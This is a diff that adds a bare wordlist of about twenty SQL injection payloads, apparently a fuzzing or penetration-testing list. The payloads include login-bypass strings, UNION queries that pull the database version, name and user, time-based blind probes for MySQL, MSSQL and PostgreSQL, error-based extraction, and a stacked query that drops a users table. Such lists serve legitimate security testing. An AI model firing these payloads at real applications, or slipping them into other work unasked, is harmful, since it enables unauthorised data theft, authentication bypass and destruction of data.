@@ -1,0 +1,20 @@
+' OR '1'='1
+' OR '1'='1'--
+' UNION SELECT null,@@version,null--
+' UNION SELECT 1,2,3,4,5--
+'; WAITFOR DELAY '00:00:05'--
+' OR SLEEP(5)--
+' AND 1=CONVERT(int,@@version)--
+admin'--
+' OR 'a'='a
+') OR ('a'='a
+' OR 1=1--
+' OR 1=1; DROP TABLE users--
+" OR "1"="1
+" OR "1"="1"--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR IF(1=1,SLEEP(5),0)--
+'; SELECT pg_sleep(5)--
+' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--
+' UNION SELECT database(),user(),version()--
